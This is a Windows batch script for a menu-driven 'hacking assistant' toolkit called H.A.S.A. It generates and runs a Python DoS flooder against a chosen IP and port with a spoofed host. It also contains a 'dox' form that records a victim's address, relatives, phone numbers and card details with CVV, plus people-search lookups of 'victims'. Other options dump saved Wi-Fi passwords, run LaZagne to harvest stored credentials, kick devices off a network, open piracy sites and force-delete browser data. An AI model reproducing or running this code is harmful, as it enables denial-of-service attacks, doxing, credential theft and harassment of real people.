@echo off
:verybeg
cd C:\Users\%username%\Desktop
del /f conv.txt
cls
color f
title H.A.S.A
echo     _  __ _ 
echo ^|_^|^|_^|(_ ^|_^|
echo ^| ^|^| ^|__)^| ^|
echo.
echo           wake up, %username% ...
echo        the matrix has you
echo      follow the white rabbit.
echo.
echo          knock, knock, %username%.
echo.
echo                        (`.         ,-,
echo                        ` `.    ,;' ^/
echo                         `.  ,'^/ .'
echo                          `. X ^/.'
echo                .-;--''--.._` ` (
echo              .'            ^/   `
echo             ,           ` '   Q '
echo             ,         ,   `._    ^\
echo          ,.^|         '     `-.;_'
echo          :  . `  ;    `  ` --,.._;
echo          ' `    ,   )   .'
echo              `._ ,  '   ^/_
echo                 ; ,''-,;' ``-
echo                  ``-..__``--`
echo.
echo Loading...
PING localhost -n 3 >NUL
cd ..
PING localhost -n 3 >NUL
WHERE "nmap"
IF ERRORLEVEL 1 set nmap=error
WHERE "git"
IF ERRORLEVEL 1  set git=error
WHERE "python"
IF ERRORLEVEL 1 set python=error
WHERE "pip"
IF ERRORLEVEL 1 set pip=error
if "%nmap%"=="error" goto depedencies
if "%git%"=="error" goto depedencies
if "%pip%"=="error" goto depedencies
if "%python%"=="error" goto depedencies
goto beg
:depedencies
color 4
cls
echo You do not have all of the depedencies required.
echo Please install them before using this tool.
echo.
echo Dependencies: Python, pip, git, nmap.
echo (Need to be installed in localpath)
pause
exit
:beg
del /f conv.txt
cls
set rsp=HASA, version 2.0
//where it all happens
:start
cd C:\Users\%username%\Desktop
set /a msg=%random%%% 10 +1
color f
cls
set lastrsp=%rsp%
echo %rsp% >> conv.txt
echo =================
type conv.txt
echo =================
echo.
set /p "in=Input: "
echo %in% >> conv.txt
set in=%in:A=a%
set in=%in:B=b%
set in=%in:C=c%
set in=%in:D=d%
set in=%in:E=e%
set in=%in:F=f%
set in=%in:G=g%
set in=%in:H=h%
set in=%in:I=i%
set in=%in:J=j%
set in=%in:K=k%
set in=%in:L=l%
set in=%in:M=m%
set in=%in:N=n%
set in=%in:O=o%
set in=%in:P=p%
set in=%in:Q=q%
set in=%in:R=r%
set in=%in:S=s%
set in=%in:T=t%
set in=%in:U=u%
set in=%in:V=v%
set in=%in:W=w%
set in=%in:X=x%
set in=%in:Y=y%
set in=%in:Z=z%
set in=%in:.=%
set in=%in:!=%
set in=%in:,=%
set in=%in:?=%
set in=%in:'=%
if "%in%"=="check" goto check
if "%in%"=="scan" goto scan
if "%in%"=="help" goto help
if "%in%"=="clear" echo Memory > conv.txt && set rsp=Cleared && goto start
if "%in%"=="makepass" goto makepass
if "%in%"=="drillbit" goto drillbit
if "%in%"=="changepass" goto changepass
if "%in%"=="findip" goto findip
if "%in%"=="trace" goto trace
if "%in%"=="arp" goto arp
if "%in%"=="stats" goto stats
if "%in%"=="netpass" goto netpass
if "%in%"=="sniff" goto sniff
if "%in%"=="table" goto table
if "%in%"=="whoami" goto whoami
if "%in%"=="tasks" goto tasks
if "%in%"=="kali" goto kali
if "%in%"=="fix" goto fix
if "%in%"=="default" goto default
if "%in%"=="email" goto email
if "%in%"=="secure" goto secure
if "%in%"=="cmd" goto cmd
if "%in%"=="kill" goto kill
if "%in%"=="locate" goto locate
if "%in%"=="shutdown" goto shutdown
if "%in%"=="clearhistory" goto clearhistory
if "%in%"=="info" goto info
if "%in%"=="phone" goto phone
if "%in%"=="scanme" goto scanme
if "%in%"=="notes" goto notes
if "%in%"=="ssh" goto ssh
if "%in%"=="movie" goto movie
if "%in%"=="ping" goto ping
if "%in%"=="ddos" goto ddos
if "%in%"=="help -v" goto helpv
if "%in%"=="speedtest" goto speedtest
if "%in%"=="scanme -s" goto scanmes
if "%in%"=="scanme -f" goto scanmef
if "%in%"=="getmac" goto getmac
if "%in%"=="passdestroy" goto passdestroy
if "%in%"=="upgradepip" pip install --upgrade pip && set rsp=upgraded && goto start
if "%in%"=="exit" del /f conv.txt && exit /b

set rsp=Invalid command && goto start
:help
echo === >> conv.txt
echo scan: uses nmap to scan ip for ports >> conv.txt
echo check: checks to see if an ip is up >> conv.txt
echo help: shows list of commands >> conv.txt
echo clear: clears screen >> conv.txt
echo makepass: makes secure password >> conv.txt
echo drillbit: uses OSINT to find address of someone >> conv.txt
echo changepass: changes your computers pass >> conv.txt
echo findip: finds the ip address of a domain >> conv.txt
echo trace: shows network hops >> conv.txt
echo arp: shows device and mac address order >> conv.txt
echo stats: shows all of your computers network info >> conv.txt
echo netpass: shows all wifi passwords your computer has >> conv.txt
echo sniff: sniffs network for packets >> conv.txt
echo table: shows network routing table >> conv.txt
echo tasks: shows all running tasks on computer >> conv.txt
echo fix: kills all "not responding" tasks >> conv.txt
echo default: finds default ip of network >> conv.txt
echo secure: scans for mitm or arp poisoning attack >> conv.txt
echo email: sends email >> conv.txt
echo kill: kills wifi >> conv.txt
echo locate: finds location of ip address >> conv.txt
echo cmd: opens cmd >> conv.txt
echo kali: open kali if installed >> conv.txt
echo shutdown: shuts down your computer >> conv.txt
echo clearhistory: clears history >> conv.txt
echo info: script that organizes information, for doxing demonstrations >> conv.txt
echo phone: runs trace on phone >> conv.txt
echo scanme: scans network for devices. OPTIONS: -s -f >> conv.txt
echo notes: simply takes notes >> conv.txt
echo ssh: automates ssh into a machine or server >> conv.txt
echo movie: opens working illegal pirating site >> conv.txt
echo ping: in case your to old-school for "check" >> conv.txt
echo upgradepip: upgrades pip, uses pip install --upgrade pip >> conv.txt
echo getmac: grabs mac address >> conv.txt
echo passdestroy: AMAZING tool, by AlessandroZ, reveals all saved passwords >> conv.txt
echo exit: exits >> conv.txt
echo practice: -t and -h for tryhackme and hackthebox respectivley>>conv.txt
echo ddos: a badly made ddos script, by me, who dosent code python very well :) >> conv.txt
echo === >> conv.txt
set rsp=Listed all commands
goto start

:speedtest
set "ip="
for /f "tokens=1-9 delims=," %%a in ('ping www.google.com^|find "Average"') do set ip=%%b
set rsp=%ip%
set rsp=%rsp: M=M%
goto start

:ddos
echo   _____  _____   ____   _____ 
echo  ^|  __ \^|  __ \ / __ \ / ____^|
echo  ^| ^|  ^| ^| ^|  ^| ^| ^|  ^| ^| (___  
echo  ^| ^|  ^| ^| ^|  ^| ^| ^|  ^| ^|\___ \ 
echo  ^| ^|__^| ^| ^|__^| ^| ^|__^| ^|____) ^|
echo  ^|_____/^|_____/ \____/^|_____/
echo.
echo loading...
IF EXIST ddos.py del /f ddos.py
timeout /T 4 /NOBREAK >NUL
if "%msg%"=="1" echo Beep beep you sad fuck
if "%msg%"=="2" echo Your not a hacker if you can ddos
if "%msg%"=="3" echo I havent slept in eight days
if "%msg%"=="4" echo The bodies in the yard
if "%msg%"=="5" echo Expect us
if "%msg%"=="6" echo I hate life
if "%msg%"=="7" echo HACKING GOVERNMENT... ASAJKDFSJKFLDJ
if "%msg%"=="8" echo Gotta love windows
if "%msg%"=="9" echo Why Kevin why?
if "%msg%"=="10" echo IT WAS DWIGHT
timeout /T 1 /NOBREAK >NUL
cls
set IP=not set
set PORT=not set
set pc=not set
set spoofip=not set
:ddosstart
color f
cls
echo =========================
echo IP: %IP%
echo PORT: %PORT%
echo FAKE IP: %spoofip%
echo =========================
echo to set: type 
echo set IP
echo set PORT
echo set FAKEIP
echo only type "true" or "false" for print connections
echo to exit: type "exit"
echo ------------------
echo TYPE "run" TO RUN
echo.
set /p "ddosin=Input: "
if "%ddosin%"=="exit" set rsp=script closed && goto start
if "%ddosin%"=="set IP" goto setIP
if "%ddosin%"=="set PORT" goto setPORT
if "%ddosin%"=="set FAKEIP" goto spoofip
if "%ddosin%"=="true" set pc=true && goto ddosstart
if "%ddosin%"=="false" set pc=false && goto ddosstart
if "%ddosin%"=="run" goto run
color 4
echo.
echo INVALID COMMAND
timeout /T 2 /NOBREAK >NUL
goto ddosstart

:spoofip
set /p "spoofip=FAKE IP: "
goto ddosstart

:setPORT
set /p "PORT=PORT: "
goto ddosstart

:setIP
set /p "IP=IP: "
goto ddosstart

:run
if "%IP%"=="not set" color 4 && echo PLEASE SET ALL PARAMETERS && timeout /T 2 /NOBREAK >NUL && goto ddosstart
if "%PORT%"=="not set" color 4 && echo PLEASE SET ALL PARAMETERS && timeout /T 2 /NOBREAK >NUL && goto ddosstart
if "%spoofip%"=="not set" color 4 && echo PLEASE SET ALL PARAMETERS && timeout /T 2 /NOBREAK >NUL && goto ddosstart
if "%pc%"=="not set" color 4 && echo PLEASE SET ALL PARAMETERS && timeout /T 2 /NOBREAK >NUL && goto ddosstart
echo STARTING...
pip install --upgrade pip
cls
echo RUNNING...
if "%pc%"=="true" goto printddos

:printddos
echo import socket>> ddos.py
echo import threading>> ddos.py


echo target = '%IP%'>> ddos.py
echo port = %PORT%>> ddos.py
echo fake_ip = '%spoofip%'>> ddos.py



echo def attack():>> ddos.py
echo     while True:>> ddos.py


echo         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)>> ddos.py
echo         s.connect((target, port))>> ddos.py
echo         s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))>> ddos.py
echo         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))>> ddos.py
echo         s.close()>> ddos.py



echo for i in range(500):>> ddos.py
echo     thread = threading.Thread(target=attack)>> ddos.py
echo     thread.start()>> ddos.py

python ddos.py

color 4
echo An error has occured, redirecting to start
timeout /T 2 /NOBREAK >NUL
goto start


:info
set entryname=Unknown
set first=Unknown
set second=Unknown
set third=Unknown
set state=Unknown
set city=Unknown
set address=Unknown
set relative1=Unknown
set relative2=Unknown
set relative3=Unknown
set phone1=Unknown
set phone2=Unknown
set phone3=Unknown
set debitcard=Unknown
set expiration=Unknown
set cvv=Unknown
set creditcard=Unknown
set criminal=Unknown
cls
echo Dox tool, ver 1.0. by ChaoS_LoveR
echo loading...
PING localhost -n 3 >NUL
cls
echo Entry name?
set /p "entryname=Input: "
set /p "first=First Name: "
set /p "second=Middle Name: "
set /p "third=Last Name: "
set /p "state=State: "
set /p "city=City: "
set /p "address=Address: "
set /p "relative1=Relative1: "
set /p "relative2=Relative2: "
set /p "relative3=Relative3: "
set /p "phone1=Phone number: "
set /p "phone2=Work phone: "
set /p "phone3=Home phone: "
set /p "debitcard=Debit card: "
set /p "expiration=Expiration: "
set /p "cvv=CVV: "
set /p "creditcard=Credit card: "
set /p "criminal=Crimes: "
echo Gathering info...
PING localhost -n 2 >NUL
echo Creating %entryname%.txt...
echo First name: %first% >> %entryname%.txt
echo Middle name: %second% >> %entryname%.txt
echo Last name: %third% >> %entryname%.txt
echo State: %state% >> %entryname%.txt
echo City: %city% >> %entryname%.txt
echo Address: %address% >> %entryname%.txt
echo Relative: %relative1% >> %entryname%.txt
echo Relative: %relative2% >> %entryname%.txt
echo Relative: %relative3% >> %entryname%.txt
echo Personal phone: %phone1% >> %entryname%.txt
echo Work phone: %phone2% >> %entryname%.txt
echo Home phone: %phone3% >> %entryname%.txt
echo Debit card: %debitcard% >> %entryname%.txt
echo Expiration date: %expiration% >> %entryname%.txt
echo CVV: %cvv% >> %entryname%.txt
echo Credit card: %creditcard% >> %entryname%.txt
echo Criminal records: %criminal% >> %entryname%.txt
PING localhost -n 2 >NUL
echo Done!
PING localhost -n 3 >NUL
set rsp=entry recorded
goto start

                  



:clearhistory
set ChromeDir=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data
del /q /s /f "%ChromeDir%"
rd /s /q "%ChromeDir%"
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
set rsp=History cleared
goto start

:shutdown
set rsp=shutting down...
shutdown /s /f /t 0
goto start 

:check
echo Please type IP
set /p "ip=Input: "
if "%ip%"=="n" goto start
echo %ip% >> conv.txt
PING -n 1 %ip%
IF ERRORLEVEL 1 set ip=down
IF "%ip%"=="down" set rsp=IP is down && goto start
set rsp=IP is up && goto start

:scan
mkdir scans
cd scans
echo Please type IP >> conv.txt
cls
echo =================
type conv.txt
echo =================
set /p "IP=Input: "
if "%IP%"=="n" goto start
echo %IP% >> conv.txt
echo Scanning...
FOR /f "tokens=4 delims= " %%a IN ('nmap -sC -v -T5 %IP% ^|findstr "Discovered"') DO echo %%a >> result.txt
type result.txt
pause
cls
echo Save scan? Y or N
set /p "scansave=Input "
if "%scansave%"=="y" cd .. && set rsp=Scan complete && goto start
cd ..
rm -rf scans
set rsp=Scan complete
goto start

:makepass
setlocal EnableDelayedExpansion
echo Generating strong password...
set _RNDLength=12
set _Alphanumeric=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
set _Str=%_Alphanumeric%987654321
:_LenLoop
if not "%_Str:~18%"=="" set _Str=%_Str:~9%& set /A _Len+=9& goto :_LenLoop
set _tmp=%_Str:~9,1%
set /A _Len=_Len+_tmp
set _count=0
set _RndAlphaNum=
:_loop
set /a _count+=1
set _RND=%Random%
set /A _RND=_RND%%%_Len%
set _RndAlphaNum=!_RndAlphaNum!!_Alphanumeric:~%_RND%,1!
if !_count! lss %_RNDLength% goto _loop
echo.
echo ===================================
set number=!_RndAlphaNum!
set rsp=%number%
goto start

:drillbit
echo All lowercase
echo Victims first name
set /p "name=Input: "
echo Victims last name
set /p "lstname=Input: "
echo Victims state abreviated
set /p "state=Input: "
echo Victims city
set /p "city=Input: "
set city=%city: =-%
start https://www.beenverified.com/people/%name%-%lstname%/%state%/%city%
set rsp=Drillbit opened
goto start

:changepass
echo (Requires admin privileges)
echo What would you like to change
echo your password to?
set /p "newpass=Input: "
NET USER %username% %newpass%
set rsp=windows pass changed to %newpass%
goto start

:findip
echo Please enter domain
set /p "domain=Input: "
nslookup %domain%
pause
goto start

:trace
echo Please enter domain or IP
set /p "trace=Input: "
tracert %trace%
pause
goto start

:arp
arp -a
pause
goto start

:stats
ipconfig/all
pause
goto start

:netpass
setlocal enabledelayedexpansion
for /f "tokens=2delims=:" %%a in ('netsh wlan show profile ^|findstr ":"') do (
    set "ssid=%%~a"
    call :getpwd "%%ssid:~1%%"
)
:getpwd
set "ssid=%*"
for /f "tokens=2delims=:" %%i in ('netsh wlan show profile name^="%ssid:"=%" key^=clear ^| findstr /C:"Key Content"') do set pass=%%i
echo %ssid% >> conv.txt
set rsp=%pass%
goto start

:sniff
netstat -a
pause
set rsp=Sniffing finished
goto start

:table
route print
pause
set rsp=Routing table opened
goto start

:whoami
whoami
pause
set rsp=user info opened
goto start

:tasks
tasklist
pause
set rsp=Tasks opened
goto start

:kali
WHERE kali >NUL
IF ERRORLEVEL 1  goto nokali
kali
goto start
:nokali
color 4
cls
echo You do not have kali installed
PING localhost -n 3 >NUL
color f
set rsp=Kali not installed as local path
goto start

:fix
echo scanning tasks...
PING localhost -n 3 >NUL
echo killing tasks...
PING localhost -n 3 >NUL
taskkill /f /fi "status eq not responding"
set rsp=Non responding tasks killed
goto start

:default
set "ip="
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "192.168"') do set ip=%%b
set ip=%ip: =%
set rsp=%ip%
goto start

:secure
net session >NUL 2>&1
if %errorlevel% == 0 goto continue
color 4
cls
echo You need admin privileges to run this.
PING localhost -n 3 >NUL
goto start
:continue
cls
echo HASA will monitor your network, if the default gateway mac
echo address changes, you will receive a warning, your wifi will
echo be automatically turned off, and your computer will shut down.
echo.
echo Only enable this if you really dont want to be monitored.
pause
cls
echo Finding default gateway...
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "192.168"') do set ip=%%b
set ip=%ip: =%
PING localhost -n 2 >NUL
echo Found: %ip%
echo Finding mac address...
for /f "tokens=2 delims= " %%a in ('arp -a^|find "%ip% "') do set mac=%%a
echo Found: %mac%
PING localhost -n 3 >NUL
cls
echo To stop this process, type "CTL + C" or close window
PING localhost -n 4 >NUL
cls
:monitoring
cls
echo Monitoring...
set macgood=false
for /f "tokens=2 delims= " %%a in ('arp -a^|find "%mac% "') do set macgood=true
if "%macgood%"=="false" goto lockdown
timeout -t 300 /nobreak >NUL
goto monitoring
:lockdown
echo x=msgbox("INSECURITY FOUND",4+16,"SECURITY BREACH") >> danger.vbs
start danger.vbs
color 4
echo SHUTTING DOWN WIFI
netsh interface set interface "Wi-Fi" disable
echo DELETING ALL COOKIES
set ChromeDir=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data
del /q /s /f "%ChromeDir%"
rd /s /q "%ChromeDir%"
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
echo SHUTTING DOWN
shutdown /s

:cmd
color a
call cmd.exe
set rsp=cmd opened
color f
goto start

:email
set /p "lemail=Your email: "
set /p "lpass=Your pass: "
set /p "recemail=Receiving email: "
set /p "subject=subject: "
set /p "message=message: "
echo import smtplib>> tmpemail.py
echo sender_email = "%lemail%">> tmpemail.py
echo rec_email = "%recemail%">> tmpemail.py
echo password = "%lpass%">> tmpemail.py
echo subject = "%subject%">> tmpemail.py
echo message = "%message%" >> tmpemail.py
echo message = 'Subject: {}\n\n{}'.format(subject, message)>> tmpemail.py
echo server = smtplib.SMTP('smtp.gmail.com:587')>> tmpemail.py
echo server.starttls()>> tmpemail.py
echo server.login(sender_email, password)>> tmpemail.py
echo print ("Login success")>> tmpemail.py
echo server.sendmail(sender_email, rec_email, message)>> tmpemail.py
echo print("Email has been sent to ", rec_email)>> tmpemail.py
python tmpemail.py
PING localhost -n 3 >NUL
del /f tmpemail.py
set rsp=Email sent
pause
goto start

:kill
echo Installing "Kickthemout" by Nikolaos Kamarinakis and David Schutz
echo Installing...
PING localhost -n 3 >NUL
git clone https://github.com/k4m4/kickthemout.git
cd kickthemout
pip3 install -r requirements.txt
echo Finding default gateway...
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "Default"') do set ip=%%b
PING localhost -n 2 >NUL
cls
echo When prompted to enter default gateway, type: %ip%.
echo When given options, press "3"
PING localhost -n 5 >NUL
pause
python kickthemout.py
set rsp=Kick them out opened
cd ..
rm -rf kickthemout
goto start

:locate
echo Whats the IP you want to scan?
set /p "ip2scan=Input: "
echo Installing IP geolocator, by Maldevel.
echo https://github.com/maldevel/IPGeoLocation
echo.
echo Installing...
PING localhost -n 3 >NUL
git clone https://github.com/maldevel/IPGeoLocation.git
cd IPGeoLocation
pip3 install -r requirements.txt
python ipgeolocation.py -t %ip2scan%
pause
set rsp=IP scanned
cd ..
rm -rf IPGeoLocation
goto start

:phone
echo what is the number, including dashes? ex. 111-111-1111
set /p "pn=pn: "
echo Opening webpage...
timeout /T 3 /NOBREAK >NUL
start https://www.usphonebook.com/%pn%
set rsp=excectued
goto start


:scanme
set "ip="
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "Default"') do set ip=%%b
set ip=%ip: =%
IF EXIST network_scanner.py del /f network_scanner.py
pip install scapy
pip install argparse

echo import scapy.all as scapy>>network_scanner.py
echo import argparse>>network_scanner.py

echo def get_args():>>network_scanner.py
echo     parser ^= argparse.ArgumentParser()>>network_scanner.py
echo     parser.add_argument('-t', '--target', dest^='target', help^='Target IP Address/Adresses')>>network_scanner.py
echo     options ^= parser.parse_args()>>network_scanner.py
echo.
echo     #Check for errors i.e if the user does not specify the target IP Address>>network_scanner.py
echo     #Quit the program if the argument is missing>>network_scanner.py
echo     #While quitting also display an error message>>network_scanner.py
echo     if not options.target:>>network_scanner.py
echo         #Code to handle if interface is not specified>>network_scanner.py
echo         parser.error("[-] Please specify an IP Address or Addresses, use --help for more info.")>>network_scanner.py
echo     return options>>network_scanner.py
echo.
echo def scan(ip):>>network_scanner.py
echo     arp_req_frame ^= scapy.ARP(pdst ^= ip)>>network_scanner.py
echo.
echo     broadcast_ether_frame ^= scapy.Ether(dst ^= "ff:ff:ff:ff:ff:ff")>>network_scanner.py
echo.
echo     broadcast_ether_arp_req_frame ^= broadcast_ether_frame / arp_req_frame>>network_scanner.py
echo.
echo     answered_list ^= scapy.srp(broadcast_ether_arp_req_frame, timeout ^= 1, verbose ^= False)[0]>>network_scanner.py
echo     result ^= []>>network_scanner.py>>network_scanner.py
echo     for i in range(0,len(answered_list)):>>network_scanner.py>>network_scanner.py
echo         client_dict ^= {"ip" : answered_list[i][1].psrc, "mac" : answered_list[i][1].hwsrc}>>network_scanner.py
echo         result.append(client_dict)>>network_scanner.py
echo.
echo     return result>>network_scanner.py
echo.
echo def display_result(result):>>network_scanner.py
echo     print("-----------------------------------\nIP Address\tMAC Address\n-----------------------------------")>>network_scanner.py
echo     for i in result:>>network_scanner.py
echo         print("{}\t{}".format(i["ip"], i["mac"]))>>network_scanner.py
echo.
echo.
echo options ^= get_args()>>network_scanner.py
echo scanned_output ^= scan(options.target)>>network_scanner.py
echo display_result(scanned_output)>>network_scanner.py
cls
python network_scanner.py -t %ip%/24
pause
del /f network_scanner.p
goto start


:notes
IF EXIST notes.txt del /f notes.txt
echo to finish taking notes, type "imdonexx"
pause
:notes1
cls
echo begin taking notes
echo ==================
type notes.txt
echo.
set /p "notes=Input: "
if "%notes%"=="undo" goto undonotes
if "%notes%"=="imdonexx" set rsp=finished notes && goto start
echo %notes% >> notes.txt
goto notes1

:undonotes
@Echo Off
SetLocal DisableDelayedExpansion

Set "SrcFile=notes.txt"

If Not Exist "%SrcFile%" Exit /B
Copy /Y "%SrcFile%" "%SrcFile%.bak">Nul 2>&1||Exit /B

(   Set "Line="
    For /F "UseBackQ Delims=" %%A In ("%SrcFile%.bak") Do (
        SetLocal EnableDelayedExpansion
        If Defined Line Echo !Line!
        EndLocal
        Set "Line=%%A"))>"%SrcFile%"
EndLocal
goto notes1

:ssh
echo whats the username?
set /p "username=user: "
echo whats the ip?
set /p "ip=ip: "
ssh %username%@%ip%
set rsp=connection tried
goto start

:movie
set gostream=up
set 123moviesip=up
echo what movie would you like to watch
set /p "movie=Input: "
set movie=%movie: =+%
PING -n 1 www.gostream.site >NUL
IF ERRORLEVEL 1 set gostream=down
if "%gostream%"=="up" start https://gostream.site/?s=%movie% && set rsp=movie opened && goto start
PING -n 1 123moviesfree.net >NUL
IF ERRORLEVEL 1 set 123moviesip=down
if "%123moviesip%"=="down" goto moviefailure
start https://123moviesfree.net/search-query/%movie%
:moviefailure
cls
color 4
echo ERROR: Failure to open website
set rsp=failure to open website
goto start

:ping
echo whats the ip
set /p "ip=Input: "
ping %ip%
pause
set rsp=%ip% pinged
goto start

:scanmes
cls
set "ip="
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "192.168"') do set ip=%%b
set ip=%ip: =%
nmap -sC -sV -v %ip%/24
pause
goto start

:scanmef
cls
set "ip="
for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "192.168"') do set ip=%%b
set ip=%ip: =%


IF EXIST network_scanner.py del /f network_scanner.py
pip install scapy
pip install argparse

echo import scapy.all as scapy>>network_scanner.py
echo import argparse>>network_scanner.py

echo def get_args():>>network_scanner.py
echo     parser ^= argparse.ArgumentParser()>>network_scanner.py
echo     parser.add_argument('-t', '--target', dest^='target', help^='Target IP Address/Adresses')>>network_scanner.py
echo     options ^= parser.parse_args()>>network_scanner.py
echo.
echo     #Check for errors i.e if the user does not specify the target IP Address>>network_scanner.py
echo     #Quit the program if the argument is missing>>network_scanner.py
echo     #While quitting also display an error message>>network_scanner.py
echo     if not options.target:>>network_scanner.py
echo         #Code to handle if interface is not specified>>network_scanner.py
echo         parser.error("[-] Please specify an IP Address or Addresses, use --help for more info.")>>network_scanner.py
echo     return options>>network_scanner.py
echo.
echo def scan(ip):>>network_scanner.py
echo     arp_req_frame ^= scapy.ARP(pdst ^= ip)>>network_scanner.py
echo.
echo     broadcast_ether_frame ^= scapy.Ether(dst ^= "ff:ff:ff:ff:ff:ff")>>network_scanner.py
echo.
echo     broadcast_ether_arp_req_frame ^= broadcast_ether_frame / arp_req_frame>>network_scanner.py
echo.
echo     answered_list ^= scapy.srp(broadcast_ether_arp_req_frame, timeout ^= 1, verbose ^= False)[0]>>network_scanner.py
echo     result ^= []>>network_scanner.py>>network_scanner.py
echo     for i in range(0,len(answered_list)):>>network_scanner.py>>network_scanner.py
echo         client_dict ^= {"ip" : answered_list[i][1].psrc, "mac" : answered_list[i][1].hwsrc}>>network_scanner.py
echo         result.append(client_dict)>>network_scanner.py
echo.
echo     return result>>network_scanner.py
echo.
echo def display_result(result):>>network_scanner.py
echo     print("-----------------------------------\nIP Address\tMAC Address\n-----------------------------------")>>network_scanner.py
echo     for i in result:>>network_scanner.py
echo         print("{}\t{}".format(i["ip"], i["mac"]))>>network_scanner.py
echo.
echo.
echo options ^= get_args()>>network_scanner.py
echo scanned_output ^= scan(options.target)>>network_scanner.py
echo display_result(scanned_output)>>network_scanner.py
cls
python network_scanner.py -t %ip%/24
pause
del /f network_scanner.p
goto start

:getmac
cls
echo Harvesting...
getmac /v /fo list
pause
set rsp=MAC found
goto start

:passdestroy
IF EXIST LaZane rm -rf LaZagne
echo Which OS are you running?
echo =========================
echo Windows [1]
echo Mac [2]
echo Linux [3]
echo.
set /p "os=Input: "
echo Would you like the output saved to a txt?
echo =========================================
echo Y or N
echo.
set /p "txt=Input: "
cls
echo Your going to like this...
timeout /T 1 /NOBREAK >NUL
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne
pip install -r requirements.txt
cls
echo Harvesting...
dir
timeout /T 3 /NOBREAK >NUL
if "%os%"=="1" cd Windows
if "%os%"=="2" cd Mac
if "%os%"=="3" cd Linux
if "%txt%"=="y" python laZagne.py all -oN -output C:\Users\%username%\Desktop && goto passdestroyend
python laZagne.py all
:passdestroyend
pause
cd C:\Users\%username%\Desktop
rm -rf LaZagne
set rsp=passwords destroyed
goto start




goto verybeg

